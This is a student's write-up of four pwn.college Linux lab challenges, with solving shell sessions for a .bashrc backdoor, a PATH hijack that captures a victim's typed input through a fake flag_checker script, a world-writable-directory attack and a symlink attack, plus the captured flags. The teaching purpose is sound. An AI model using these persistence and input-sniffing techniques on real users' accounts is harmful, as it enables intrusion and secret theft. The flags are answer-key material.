# Silly Shenanigans

## Bashrc Backdoor
When your shell starts up, it looks for .bashrc file in your home directory and executes it as a startup script. You can customize your /home/hacker/.bashrc with useful things, such as setting environment variables, tweaking your shell configuration, and so on.

You can also use it for evil! An unwitting victim's .bashrc is a common target for shenanigans. Imagine sneaking onto your friend's computer and adding a echo "Hackers were here!" at the end of their .bashrc. That's funny, but the same capability can be used for much more nefarious purposes. Malicious software, for example, often targets startup scripts such as .bashrc to maintain persistence into the future!

In this challenge, we'll pretend that you've broken into a victim user's machine! That user is named zardus, with a home directory of /home/zardus. You, as the hacker user, have write access to his .bashrc, and zardus has read-access to /flag. The victim is simulated by the script /challenge/victim, and you can launch this script at any time to observe the victim logging into the computer. Can you get the flag?

HINT: Like the scripts you explored in Chaining Commands, the .bashrc script is just a shell script. Adding a new line with a command on it (e.g., echo Hello Hackers) will get that command executed, so all you really need to think about is what command will get you the flag!

NOTE: The victim's /home/zardus/.bashrc will have a lot of stuff already in it: the shell's startup is a complex affair. Don't panic --- just add your payload to the end and hope for the best!

HINT: Need to poke around as zardus to debug your solution? In practice mode, you can use sudo su --login zardus to drop into a Zardus session!

### Solve
**Flag:** `pwn.college{83noPy3GGUWbyrsn5tcXYoNndCt.0VMzEzNxwSN1gjNzEzW}`
 for this Challenge,i opened the .bashrc script and added cat /flag and pipe the output into a text file in a publicaly readable directory like tmp as zardus user can't create a file in hacker user directory . Then i ran /challenge/victim to simulate zardus user and then i catted the text file to get the flag.

```bash 
hacker@shenanigans~bashrc-backdoor:~$ nano /home/zardus/.bashrc
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
cat /flag > /tmp/flag1.txt
hacker@shenanigans~bashrc-backdoor:/$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
hacker@shenanigans~bashrc-backdoor:/$ cat /tmp/flag1.txt
pwn.college{83noPy3GGUWbyrsn5tcXYoNndCt.0VMzEzNxwSN1gjNzEzW}
```

### New Learnings
I learned how the .bashrc of a user can exploited to carry out commands that can only be executed by that particular user with permission.

### References

## Sniffing Input
In the previous level, you abused Zardus's ~/.bashrc to make him run commands for you.

This time, Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named flag_checker, manually typing the flag into it for verification.

Your mission is to use your continued write access to Zardus's .bashrc to intercept this flag. Remember how you hijacked commands in the Pondering PATH module? Can you use that capability to hijack the flag_checker?

HINT: Is Zardus getting spooked by your hijack? He's careful --- he checks for the flag_checker prompt of Type the flag. Make sure your hijack also prints this prompt (e.g., echo "Type the flag"). Other than printing that prompt, your fake flag_checker can either just a) cat Zardus's input to stdout (e.g., cat with no arguments) or b) read it into a variable and echo it out. Up to you!

HINT: Don't forget to make your fake flag_checker executable, like you learned in the Perceiving Permissions module!

### Solve
**Flag:** `pwn.college{QTKWCQamGVCzW_DgP1RpEtOkllJ.0VNzEzNxwSN1gjNzEzW}`
 for this Challenge,i created a new directory in hacker directory and created a script called flag_checker and added the required text output for zardus and take the inputed flag from zardus and transfer it into a text file in a publicaly readable directory like tmp as zardus user can't create a file in hacker user directory.Then i made it executable and opened the zardus's .bashrc script and updated the PATH variable with /home/hacker/new at the beginning. Then i ran /challenge/victim to simulate zardus user and then i catted the text file to get the flag.

```bash 
hacker@shenanigans~sniffing-input:~$ mkdir ~/new
hacker@shenanigans~sniffing-input:~$ nano ~/new/flag_checker
#!/bin/bash
echo "Type the flag" 
cat > /tmp/flag1.txt
hacker@shenanigans~sniffing-input:~$ chmod +x ~/new/flag_checker
hacker@shenanigans~sniffing-input:~$ echo 'export PATH=/home/hacker/new:$PATH' >> /home/zardus/.bashrc
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag
*************************************************************exit
^Z
[2]+  Stopped                 /challenge/victim
hacker@shenanigans~sniffing-input:~$ cat /tmp/flag1.txt
pwn.college{QTKWCQamGVCzW_DgP1RpEtOkllJ.0VNzEzNxwSN1gjNzEzW}
```

### New Learnings
I learned how the PATH variable can be altered to get .bashrc of a user to carry out commands that we need them to do.

### References

## Overshared Directories
Alright, Zardus has wised up --- why would he have a writable .bashrc, anyways? But a more common scenario is that users on the same system, to make it easier to collaborate, will make their home directories world writable. What's the problem here?

The problem is that a subtlety of Linux file/directory permissions is that anyone with write access to a directory can move and delete files in it. For example, let's say that Zardus has a world-writable directory for collaboration:

```bash
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "do pwn.college" > /tmp/collab/todo-list
```

And then a hacker comes along and does the following, despite not owning the todo-list file!

```bash
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 zardus zardus 15 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$ rm /tmp/collab/todo-list
rm: remove write-protected regular file '/tmp/collab/todo-list'? y
hacker@dojo:~$ echo "send hacker money" > /tmp/collab/todo-list
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 hacker hacker 18 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$
```
This might seem counterintuitive: hacker has no write access to the todo-list but the end result is that they can change the content. But think about it this way: a file's connection to a directory lives in the directory in the end, and users with write access to that directory can mess with it. Of course, this has security implications when important directories are world-writable.

In this challenge, for convenience, Zardus opened up his home directory:

```bash
zardus@dojo:~$ chmod a+w /home/zardus
```
As you know, there are lots of sensitive files in that directory such as .bashrc! Can you replicate the previous attack with write access to /home/zardus instead of /home/zardus/.bashrc?

### Solve
**Flag:** `pwn.college{4GLYy1PaKbbd0pBF-LhzO4pgSYc.0FM0EzNxwSN1gjNzEzW}`
 for this Challenge,i followed initial steps of previous challenge and then i moved the original .bashrc to a new directory within zardus directory and made i create a fake .bashrc script Then i made it executable and opened the zardus's .bashrc script and updated the PATH variable with /home/hacker/new at the beginning. Then i ran /challenge/victim to simulate zardus user and then i catted the text file to get the flag.

```bash 
hacker@shenanigans~overshared-directories:~$ mkdir new
hacker@shenanigans~overshared-directories:~$ nano ~/new/flag_checker
hacker@shenanigans~overshared-directories:~$ chmod +x ~/new/flag_checker
hacker@shenanigans~overshared-directories:~$ mkdir  /home/zardus/new2
hacker@shenanigans~overshared-directories:~$ mv /home/zardus/.bashrc /home/zardus/new2
hacker@shenanigans~overshared-directories:~$ nano /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ /challenge/victim
Username: zardus
Password: **********
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag
*************************************************************exit
^Z
[2]+  Stopped                 /challenge/victim
hacker@shenanigans~overshared-directories:~$ cat /tmp/flag1.txt
pwn.college{4GLYy1PaKbbd0pBF-LhzO4pgSYc.0FM0EzNxwSN1gjNzEzW}
exit
```

### New Learnings
I learned how the PATH variable can be altered to get .bashrc of a user to carry out commands that we need them to do.

### References

## Tricky Linking
Okay, Zardus has wised up! No more sharing the home directory: despite the reduced convenience, Zardus has moved to sharing /tmp/collab. He's made that directory world-readable and has started a list of evil commands to remember!

```bash
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "rm -rf /" > /tmp/collab/evil-commands.txt
```
In this challenge, when you run /challenge/victim, Zardus will add cat /flag to that list of commands:

```bash
hacker@dojo:~$ /challenge/victim

Username: zardus
Password: **********
zardus@dojo:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@dojo:~$ exit
logout
hacker@dojo:~$
```
Recall from the previous level that, having write access to /tmp/collab, the hacker user can replace that evil-commands.txt file. Also remember from Comprehending Commands that files can link to other files. What happens if hacker replaces evil-commands.txt with a symbolic link to some sensitive file that zardus can write to? Chaos and shenanigans!

You know the file to link to. Pull off the attack, and get /flag (which, for this level, Zardus can read again!).

HINT: You'll need to run /challenge/victim twice: once to get cat /flag written to where you want, and once to trigger it!

Is /tmp dangerous to use??? Despite the attack shown here, /tmp can be used safely. The directory is world-writable, but has a special permission bit set:

```bash
hacker@dojo:~$ ls -ld /tmp
```
drwxrwxrwt 29 root root 1056768 Jun  6 14:06 /tmp
hacker@dojo:~$
That t bit at the end is the sticky bit. The sticky bit means that the directory only allows the owners of files to rename or remove files in the directory. It's designed to prevent this exact attack! The problem in this challenge, of course, was that Zardus did not enable the sticky bit on /tmp/collab. This would have closed the hole in this specific case:

```bash
zardus@dojo:~$ chmod +t /tmp/collab
```
Of course, shared resources like world-writable directories are still dangerous. Much later, in the Race Conditions of the Green Belt material, you'll see many ways in which such resources can cause security issues!

### Solve
**Flag:** `pwn.college{4R97_HbOm4r4Ci3URzozhsnsIoo.0VM0EzNxwSN1gjNzEzW}`
 for this Challenge,i removed the target file evil_commands and made a same filename as symbolic link to zardus's .bashrc script.Then i ran /challenge/victim twice to get the flag.

```bash 
hacker@shenanigans~tricky-linking:~$ rm -f /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{4R97_HbOm4r4Ci3URzozhsnsIoo.0VM0EzNxwSN1gjNzEzW}
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
```

### New Learnings
I learned how the a symbolic link can used in a .bashrc script to exploit the user to execute a some other program which the use has the permission.

### References